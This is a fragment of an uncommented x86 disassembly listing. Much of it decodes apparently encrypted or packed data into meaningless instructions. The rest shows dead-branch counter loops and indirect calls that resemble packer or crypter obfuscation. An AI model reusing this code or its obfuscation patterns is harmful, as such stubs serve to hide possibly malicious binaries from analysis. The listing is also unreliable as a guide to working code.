  404883:	dec    edi
  404884:	scas   eax,DWORD PTR es:[edi]
  404885:	(bad)  
  404887:	mov    ds:0x3d52eea2,al
  40488c:	mov    ch,0x52
  40488e:	and    DWORD PTR [eax],esp
  404890:	lods   al,BYTE PTR ds:[esi]
  404891:	or     esp,DWORD PTR [ecx-0x1bff8b1e]
  404897:	stos   DWORD PTR es:[edi],eax
  404898:	add    edx,esi
  40489a:	je     0x404821
  40489c:	cmp    BYTE PTR [edi-0xc0ba2ad],al
  4048a2:	mov    ecx,0x3cff2953
  4048a7:	xor    DWORD PTR [edi+ebx*4-0x47],esi
  4048ab:	mov    dh,0x58
  4048ad:	shr    ebx,cl
  4048af:	ss retf 
  4048b1:	or     dl,BYTE PTR [esi-0x5f]
  4048b4:	push   edx
  4048b5:	pop    edi
  4048b6:	add    DWORD PTR [edx-0x154acf4c],eax
  4048bc:	xor    al,0xdb
  4048be:	out    0x2f,al
  4048c0:	into   
  4048c1:	mov    ds:0x37e8f63a,al
  4048c6:	outs   dx,DWORD PTR ds:[esi]
  4048c7:	scas   al,BYTE PTR es:[edi]
  4048c8:	push   ecx
  4048c9:	je     0x40490d
  4048cb:	ficomp WORD PTR [esi+0x3417b99b]
  4048d1:	cli    
  4048d2:	jno    0xbd136f8e
  4048d8:	lods   eax,DWORD PTR ds:[esi]
  4048d9:	pop    ecx
  4048da:	into   
  4048db:	xchg   edi,eax
  4048dc:	call   0xb3a4e0ba
  4048e1:	cli    
  4048e2:	adc    eax,0x78729786
  4048e7:	in     al,0xad
  4048e9:	push   ebx
  4048ea:	scas   al,BYTE PTR es:[edi]
  4048eb:	jg     0x4048cc
  4048ed:	mov    ebp,0xf025af48
  4048f2:	mov    BYTE PTR [eax-0x3eb958b3],dl
  4048f8:	mov    al,0x4a
  4048fa:	lods   al,BYTE PTR ds:[esi]
  4048fb:	popa   
  4048fc:	bnd jp 0x4048c8
  4048ff:	popf   
  404900:	(bad)  
  404901:	jg     0x4048bc
  404903:	test   bh,dh
  404905:	pushf  
  404906:	adc    cl,dh
  404908:	pop    edx
  404909:	lods   al,BYTE PTR ds:[esi]
  40490a:	cmp    esp,DWORD PTR [eax]
  40490c:	push   eax
  40490d:	call   0xaa97:0x3f6f33e0
  404914:	push   eax
  404915:	cmp    al,0x9f
  404917:	cmp    eax,0xda88d691
  40491c:	add    al,bl
  40491e:	xor    eax,DWORD PTR [ebp+0x2b5e64d3]
  404924:	(bad)  
  404925:	ds out dx,al
  404927:	add    esp,DWORD PTR [eax+0x9]
  40492a:	mov    ds,ecx
  40492c:	loopne 0x404983
  40492e:	jl     0x4049a4
  404930:	adc    DWORD PTR [ecx+0x733ae684],edi
  404936:	pop    eax
  404937:	jno    0x404940
  404939:	dec    edx
  40493a:	jmp    0x40496d
  40493c:	arpl   WORD PTR [esi+esi*4],cx
  40493f:	je     0x404920
  404941:	cmp    DWORD PTR [esi-0x74],esi
  404944:	bound  ebp,QWORD PTR fs:[ebx+0x7f921fb7]
  40494b:	sahf   
  40494c:	mov    edi,0xafad7bd8
  404951:	inc    edi
  404952:	mov    edx,DWORD PTR [ebp-0x4b50270]
  404958:	dec    ebp
  404959:	dec    edx
  40495a:	jae    0x4048f1
  40495c:	mov    ebp,db5
  40495f:	(bad)  
  404960:	hlt    
  404961:	push   0xfffffff7
  404963:	fucom  st(6)
  404965:	xor    BYTE PTR [edi],0x58
  404968:	sub    BYTE PTR [edx+eax*2+0x57],al
  40496c:	mov    ebp,0xc232ee2b
  404971:	and    al,0x41
  404973:	jno    0x4049d2
  404975:	out    dx,eax
  404976:	mov    eax,ds:0x3eae6a25
  40497b:	adc    al,0x11
  40497d:	popf   
  40497e:	adc    WORD PTR [ebp+0x5],di
  404982:	fld    st(7)
  404984:	add    DWORD PTR [edx-0x6147cfc1],0xad0f8dfb
  40498e:	xchg   DWORD PTR [edx+0x6c2e8df2],ecx
  404994:	mov    esp,0xc4687846
  404999:	cmp    BYTE PTR [ebx+0x2100517d],al
  40499f:	xchg   BYTE PTR [ecx],al
  4049a1:	loopne 0x40493b
  4049a3:	and    bl,BYTE PTR [ecx+0x78dbb6e8]
  4049a9:	test   BYTE PTR [esi],0x78
  4049ac:	popa   
  4049ad:	sub    cl,BYTE PTR [ebx-0x5a3f9c81]
  4049b3:	fdivr  QWORD PTR [ecx-0x6cfd91a4]
  4049b9:	inc    ecx
  4049ba:	outs   dx,DWORD PTR ds:[esi]
  4049bb:	sahf   
  4049bc:	test   edi,ecx
  4049be:	ins    WORD PTR es:[edi],dx
  4049c0:	mov    ebx,0x63d04f42
  4049c5:	scas   al,BYTE PTR es:[edi]
  4049c6:	add    al,0x7b
  4049c8:	fs out 0xe4,eax
  4049cb:	cmp    edx,esi
  4049cd:	mov    bl,0x26
  4049cf:	jle    0x4049b1
  4049d1:	xor    bl,cl
  4049d3:	outs   dx,DWORD PTR ds:[esi]
  4049d4:	rol    DWORD PTR [edx+0x6b],0xef
  4049d8:	int    0xd2
  4049da:	xchg   edi,eax
  4049db:	fisubr DWORD PTR ds:0xc1508aa4
  4049e1:	mov    bh,0x4f
  4049e3:	jno    0x4049cc
  4049e5:	ss popa 
  4049e7:	test   BYTE PTR [eax],dh
  4049e9:	bound  eax,QWORD PTR [ecx-0x38]
  4049ec:	ins    DWORD PTR es:[edi],dx
  4049ed:	in     al,dx
  4049ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049ef:	das    
  4049f0:	mov    bl,0x63
  4049f2:	into   
  4049f3:	sub    BYTE PTR [edi],bl
  4049f5:	in     eax,dx
  4049f6:	mov    al,BYTE PTR [ecx]
  4049f8:	sub    bl,BYTE PTR ds:0xfcda2263
  4049fe:	dec    edi
  4049ff:	cmp    al,0xf2
  404a01:	jmp    FWORD PTR [edx-0x11]
  404a04:	mov    eax,DWORD PTR [ebx+ebp*2+0x15]
  404a08:	jp     0x4049e3
  404a0a:	sub    DWORD PTR [ecx+0x13ec6513],edx
  404a10:	sbb    BYTE PTR [ecx+0x22493a7f],0xc9
  404a17:	jecxz  0x4049a3
  404a19:	dec    ebp
  404a1a:	enter  0x611e,0xcd
  404a1e:	xchg   ebx,ebx
  404a20:	mov    dl,0xc1
  404a22:	jp     0x4049fe
  404a24:	cwde   
  404a25:	xor    bh,BYTE PTR [esi]
  404a27:	sbb    BYTE PTR [ebx+0x2ceedab2],0x59
  404a2e:	dec    ecx
  404a2f:	adc    al,0x61
  404a31:	sar    DWORD PTR [ebx-0x462206a9],1
  404a37:	jno    0x4049f8
  404a39:	xlat   BYTE PTR ds:[ebx]
  404a3a:	xor    edx,eax
  404a3c:	xor    BYTE PTR [ebp+0x1e0cb735],bh
  404a42:	cmp    al,0x71
  404a44:	push   eax
  404a45:	stos   DWORD PTR es:[edi],eax
  404a46:	rcl    ecx,1
  404a48:	push   esp
  404a49:	repnz mov bh,0x1d
  404a4c:	sbb    DWORD PTR [ecx-0x44],0x5b28782e
  404a53:	xor    BYTE PTR [esi],ah
  404a55:	ins    BYTE PTR es:[edi],dx
  404a56:	cmp    eax,0xfd6c70a8
  404a5b:	sbb    DWORD PTR [ebx],eax
  404a5d:	imul   edx,DWORD PTR ds:0xcc5529a1,0xa0f70eca
  404a67:	int3   
  404a68:	jecxz  0x404ac6
  404a6a:	xor    al,0xec
  404a6c:	call   0xf3ec177f
  404a71:	aad    0x33
  404a73:	inc    esi
  404a74:	and    DWORD PTR [esi+0x35],edi
  404a77:	test   al,0xea
  404a79:	fs jl  0x404adc
  404a7c:	int    0xff
  404a7e:	and    DWORD PTR ds:0xa9c45a12,ecx
  404a84:	out    dx,al
  404a85:	rcl    BYTE PTR [ecx-0xe],0xd5
  404a89:	cmp    esp,0xffffff9e
  404a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a8d:	unpckhps xmm1,XMMWORD PTR [ecx+ebp*1-0x623b652a]
  404a95:	(bad)  
  404a96:	cdq    
  404a97:	push   ecx
  404a98:	sahf   
  404a99:	rcr    esp,cl
  404a9b:	jle    0x404b0b
  404a9d:	sbb    ah,BYTE PTR ds:0x8ba4e21d
  404aa3:	push   ds
  404aa4:	pop    edi
  404aa5:	fdivr  DWORD PTR [esi-0x21]
  404aa8:	cmp    BYTE PTR [esi-0x72175231],0x87
  404aaf:	cmp    BYTE PTR [ecx],al
  404ab1:	ret    
  404ab2:	cmc    
  404ab3:	mov    edi,0xc57d1e76
  404ab8:	sbb    DWORD PTR [esi+0x25ee5d9a],0x589736d4
  404ac2:	mov    ds:0xf5d13388,al
  404ac7:	jae    0x404b18
  404ac9:	dec    ecx
  404aca:	mov    ebp,0x2984ecbd
  404acf:	sbb    ebp,DWORD PTR [edx]
  404ad1:	jnp    0x404af6
  404ad3:	dec    ebx
  404ad4:	inc    ebp
  404ad5:	clc    
  404ad6:	scas   eax,DWORD PTR es:[edi]
  404ad7:	outs   dx,DWORD PTR ds:[esi]
  404ad8:	ss call 0x33c007f6
  404ade:	ins    BYTE PTR es:[edi],dx
  404adf:	test   BYTE PTR [edx+0x64],bl
  404ae2:	pop    esp
  404ae3:	cld    
  404ae4:	push   ebx
  404ae5:	mov    WORD PTR [esp+edx*1-0x2830648],ss
  404aec:	pop    edi
  404aed:	cmc    
  404aee:	stos   DWORD PTR es:[edi],eax
  404aef:	xor    al,0xdb
  404af1:	enter  0x6a14,0x4e
  404af5:	mov    BYTE PTR [ebx+edi*1+0x5be0c85a],dl
  404afc:	shl    BYTE PTR [esi+0x3f],1
  404aff:	mov    cl,0x54
  404b01:	fs das 
  404b03:	lar    esi,WORD PTR [eax-0x6d9b558a]
  404b0a:	sahf   
  404b0b:	fistp  QWORD PTR [ecx+edi*4+0x4e5b82f4]
  404b12:	mov    edx,0xd55840b7
  404b17:	xchg   edx,eax
  404b18:	ins    DWORD PTR es:[edi],dx
  404b19:	or     eax,0xc0435f54
  404b1e:	inc    edx
  404b1f:	xor    al,BYTE PTR [esi-0x47]
  404b22:	(bad)  
  404b23:	sti    
  404b24:	aam    0x30
  404b26:	jp     0x404b2f
  404b28:	sub    BYTE PTR [eax+0x1f9ffca7],0xfa
  404b2f:	imul   edi,DWORD PTR [edi],0xffffffec
  404b32:	inc    ebx
  404b33:	jbe    0x404b70
  404b35:	mov    esp,0x630ce57b
  404b3a:	pop    eax
  404b3b:	cmp    eax,0xbe3bce40
  404b40:	inc    ecx
  404b41:	repz inc edx
  404b43:	push   edi
  404b44:	into   
  404b45:	or     ebx,ebp
  404b47:	add    esi,edx
  404b49:	aas    
  404b4a:	fs and al,0xad
  404b4d:	stc    
  404b4e:	call   FWORD PTR [ebx-0x64]
  404b51:	pop    eax
  404b52:	in     al,dx
  404b53:	push   0x2bcaf92a
  404b58:	adc    edx,DWORD PTR [ebx+0x6a]
  404b5b:	jmp    0x432ce689
  404b60:	xchg   edi,eax
  404b61:	sbb    eax,0x1fa74597
  404b66:	push   ecx
  404b67:	push   0x4f0ddfde
  404b6c:	pop    esi
  404b6d:	or     esi,edi
  404b6f:	or     DWORD PTR [si-0x5348],edi
  404b74:	dec    edx
  404b75:	mov    bh,0xe3
  404b77:	or     BYTE PTR [ebx],bh
  404b79:	mov    eax,ds:0x91b888b3
  404b7e:	xor    DWORD PTR [esi-0xf21d98d],edx
  404b84:	add    dh,bl
  404b86:	ja     0x404b0e
  404b88:	in     al,dx
  404b89:	add    al,0xb9
  404b8b:	int    0xfe
  404b8d:	lock out dx,eax
  404b8f:	dec    esi
  404b90:	inc    esi
  404b91:	cmp    dh,BYTE PTR [ebx]
  404b93:	retf   
  404b94:	stos   DWORD PTR es:[edi],eax
  404b95:	cmc    
  404b96:	das    
  404b97:	enter  0xa77a,0x9d
  404b9b:	loope  0x404b40
  404b9d:	xor    esi,DWORD PTR [edi+0x62b50634]
  404ba3:	std    
  404ba4:	ss out 0x59,al
  404ba7:	stos   DWORD PTR es:[edi],eax
  404ba8:	(bad)  
  404ba9:	pop    ecx
  404baa:	jg     0x404b70
  404bac:	mov    al,ds:0x4d70401a
  404bb1:	sbb    BYTE PTR gs:[bp+di-0x23],bh
  404bb6:	addr16 push ebp
  404bb8:	sub    eax,0x800673eb
  404bbd:	mov    ah,0x8
  404bbf:	cmc    
  404bc0:	xchg   esi,eax
  404bc1:	icebp  
  404bc2:	ins    BYTE PTR es:[edi],dx
  404bc3:	mov    fs,WORD PTR [ecx]
  404bc5:	mov    dl,0x36
  404bc7:	push   ss
  404bc8:	push   0x4fbcb206
  404bcd:	cmp    dl,BYTE PTR [esi+0x4123747]
  404bd3:	adc    al,0xd0
  404bd5:	in     eax,dx
  404bd6:	xchg   edi,eax
  404bd7:	cwde   
  404bd8:	cld    
  404bd9:	push   ebp
  404bda:	mov    bh,0x88
  404bdc:	mov    WORD PTR [ebx],ds
  404bde:	jmp    0x404b6d
  404be0:	mov    edi,0x70a198f6
  404be5:	cwde   
  404be6:	pop    ebx
  404be7:	pop    ebp
  404be8:	cdq    
  404be9:	lds    ebx,FWORD PTR [edi]
  404beb:	jae    0x404c62
  404bed:	pop    edi
  404bee:	push   edi
  404bef:	push   0xfffffffd
  404bf1:	add    ecx,DWORD PTR [ecx+0x5a]
  404bf4:	push   ebp
  404bf5:	jns    0x404c1b
  404bf7:	mov    DWORD PTR [ebp-0x3a],0x6d5f696e
  404bfe:	or     al,bl
  404c00:	popa   
  404c01:	mov    ebp,0x15a8a5f6
  404c06:	test   eax,0x4d468711
  404c0b:	mov    esi,0xffb10fc5
  404c10:	cmp    DWORD PTR [edi],esi
  404c12:	popf   
  404c13:	dec    ebx
  404c14:	sar    edx,1
  404c16:	xchg   BYTE PTR [esi+0x1f],bh
  404c19:	bound  esi,QWORD PTR [esi+0x53]
  404c1c:	sbb    DWORD PTR [ebx+ebx*8+0x4],esp
  404c20:	mov    cl,0x5
  404c22:	gs out dx,al
  404c24:	inc    eax
  404c25:	mov    ds:0x760d07dc,eax
  404c2a:	ja     0x404c59
  404c2c:	mov    dl,0x71
  404c2e:	add    ebp,esi
  404c30:	out    dx,eax
  404c31:	mov    ebx,0x71376b65
  404c36:	outs   dx,DWORD PTR ds:[esi]
  404c37:	fimul  WORD PTR [edi+0x72141f2a]
  404c3d:	jns    0x404c36
  404c3f:	repnz or BYTE PTR [ebx-0x6a7bc6db],dl
  404c46:	hlt    
  404c47:	rol    BYTE PTR [ecx+0x29],cl
  404c4a:	test   BYTE PTR [ebx+0x23681c9],al
  404c50:	xchg   ebp,eax
  404c51:	aad    0xb
  404c53:	mov    esp,DWORD PTR [ecx]
  404c55:	ss es pushw ds
  404c59:	and    eax,0xdd8ea690
  404c5e:	jno    0x404ccd
  404c60:	dec    esp
  404c61:	sti    
  404c62:	cmp    BYTE PTR [esi+0x1fc895f6],ah
  404c68:	(bad)  
  404c69:	mov    bh,0x8a
  404c6b:	inc    edx
  404c6c:	mov    al,ds:0x98827ece
  404c71:	scas   al,BYTE PTR es:[edi]
  404c72:	std    
  404c73:	fs cmp eax,0xe32ff24a
  404c79:	sbb    al,0x43
  404c7b:	fist   DWORD PTR [ecx]
  404c7d:	cmp    cl,cl
  404c7f:	pop    ss
  404c80:	(bad)  
  404c81:	jmp    0x404cdd
  404c83:	push   ss
  404c84:	cmp    DWORD PTR [edx-0x7e81b1d8],0xa37afe47
  404c8e:	enter  0x33cd,0xaa
  404c92:	div    BYTE PTR [ebx-0x4c]
  404c95:	jnp    0x404c97
  404c97:	xchg   edx,eax
  404c98:	cdq    
  404c99:	sbb    BYTE PTR [edi-0x11eb1d00],dh
  404c9f:	bound  ecx,QWORD PTR [edi-0xa]
  404ca2:	stos   BYTE PTR es:[edi],al
  404ca3:	pop    ds
  404ca4:	pop    ebp
  404ca5:	sti    
  404ca6:	cmp    ah,BYTE PTR [edi]
  404ca8:	mov    cl,al
  404caa:	sub    ch,bh
  404cac:	retf   0xd666
  404caf:	addr16 jnp 0x404c4c
  404cb2:	mov    esp,0xf7e5c17d
  404cb7:	neg    DWORD PTR [esi-0x30]
  404cba:	mov    ds:0x2b451f5f,eax
  404cbf:	dec    esi
  404cc0:	push   ss
  404cc1:	sub    al,0xc8
  404cc3:	or     DWORD PTR [edx-0x19c99c42],eax
  404cc9:	das    
  404cca:	sbb    ch,BYTE PTR fs:[ebx-0x3b]
  404cce:	lds    ebp,FWORD PTR [eax-0x7a9cc59c]
  404cd4:	push   ebp
  404cd5:	dec    esp
  404cd6:	push   0xd6ab97ca
  404cdb:	pop    ebx
  404cdc:	push   0xffffffaa
  404cde:	jl     0x404d1a
  404ce0:	scas   al,BYTE PTR es:[edi]
  404ce1:	jns    0x404cd8
  404ce3:	popa   
  404ce4:	jle    0x404d60
  404ce6:	add    esi,edi
  404ce8:	mov    dh,0xa3
  404cea:	mov    dh,0x94
  404cec:	sbb    BYTE PTR [ebp-0x7f3e9515],bl
  404cf2:	cmp    BYTE PTR [ebx-0x65d85b8c],0x7a
  404cf9:	xchg   ebp,eax
  404cfa:	in     al,0xc8
  404cfc:	or     al,0x77
  404cfe:	outs   dx,DWORD PTR ds:[esi]
  404cff:	int3   
  404d00:	push   esp
  404d01:	jmp    0xaa1f:0x7ec5ac5a
  404d08:	test   BYTE PTR [eax],dh
  404d0a:	and    ah,bh
  404d0c:	(bad)  
  404d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d0e:	sbb    ch,BYTE PTR [edx]
  404d10:	shl    BYTE PTR [edx+edi*4],1
  404d13:	aaa    
  404d14:	popa   
  404d15:	(bad)  
  404d16:	jle    0x404cd6
  404d18:	sub    al,bl
  404d1a:	cmp    eax,0x77b21ca1
  404d1f:	or     DWORD PTR [edx+edi*2],ecx
  404d22:	ss add al,0x96
  404d25:	pop    esp
  404d26:	cmp    eax,0x271775f2
  404d2b:	add    esp,DWORD PTR [eax+0x72]
  404d2e:	je     0x404d32
  404d30:	jge    0x404daf
  404d32:	in     eax,0xe
  404d34:	test   BYTE PTR [edx+eiz*4+0x21],dl
  404d38:	push   ebp
  404d39:	cmp    edx,esi
  404d3b:	mov    ecx,DWORD PTR [esi-0x24d85903]
  404d41:	fisubr WORD PTR [eax-0x25]
  404d44:	sbb    esp,DWORD PTR [esi+eax*2-0x62a1092e]
  404d4b:	repnz mov al,ds:0x5ea77ad9
  404d51:	aad    0x32
  404d53:	imul   edi,esi,0xffffffb4
  404d56:	sbb    eax,0xccc046de
  404d5b:	loopne 0x404d0d
  404d5d:	dec    eax
  404d5e:	mov    BYTE PTR [ebx],cl
  404d60:	and    cl,cl
  404d62:	adc    eax,0xdccd63eb
  404d67:	(bad)  
  404d68:	xor    al,0x41
  404d6a:	jp     0x404cfa
  404d6c:	imul   eax,DWORD PTR [edi+eax*1-0x3f83141b],0x3ec0eb53
  404d77:	push   edi
  404d78:	jnp    0x404d0b
  404d7a:	lods   al,BYTE PTR ds:[esi]
  404d7b:	jle    0x404d17
  404d7d:	xchg   ecx,eax
  404d7e:	jno    0x404d0c
  404d80:	rep lods al,BYTE PTR ds:[esi]
  404d82:	gs sahf 
  404d84:	ret    
  404d85:	push   esp
  404d86:	aaa    
  404d87:	call   0x894:0x7cfd81a1
  404d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8f:	call   0xfdf8:0x40ab5a84
  404d96:	scas   al,BYTE PTR es:[edi]
  404d97:	icebp  
  404d98:	jl     0x404d38
  404d9a:	je     0x404d8e
  404d9c:	inc    esp
  404d9d:	lahf   
  404d9e:	test   DWORD PTR [ecx],ecx
  404da0:	xor    al,0x8b
  404da2:	mov    ebp,0x1f1d385
  404da7:	arpl   WORD PTR [ecx+0x44851a52],sp
  404dad:	cmp    al,0x8e
  404daf:	add    ebx,ebp
  404db1:	ret    0x2291
  404db4:	push   cs
  404db5:	outs   dx,BYTE PTR ds:[esi]
  404db6:	pop    edx
  404db7:	dec    esi
  404db8:	icebp  
  404db9:	sbb    al,0x7b
  404dbb:	loopne 0x404d89
  404dbd:	or     edi,0xe12692f2
  404dc3:	adc    al,0x65
  404dc5:	adc    al,0x7a
  404dc7:	pop    es
  404dc8:	adc    DWORD PTR [esi+0x36],ebx
  404dcb:	stos   DWORD PTR es:[edi],eax
  404dcc:	inc    edx
  404dcd:	loope  0x404dc9
  404dcf:	sbb    eax,0x8b21dd1d
  404dd4:	lods   eax,DWORD PTR ds:[esi]
  404dd5:	xchg   edx,eax
  404dd6:	inc    ebx
  404dd7:	inc    esp
  404dd8:	(bad)  
  404dd9:	loopne 0x404e27
  404ddb:	aas    
  404ddc:	push   ecx
  404ddd:	add    eax,0x54b2ef42
  404de2:	es fcmovnu st,st(6)
  404de5:	retf   0x6ac0
  404de8:	std    
  404de9:	jge    0x404d8a
  404deb:	arpl   WORD PTR [edi-0x56],bp
  404dee:	sahf   
  404def:	sub    al,dh
  404df1:	in     eax,0x2a
  404df3:	pop    ebp
  404df4:	adc    DWORD PTR ds:0x840fc258,0xd8
  404dfe:	and    eax,DWORD PTR ds:0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
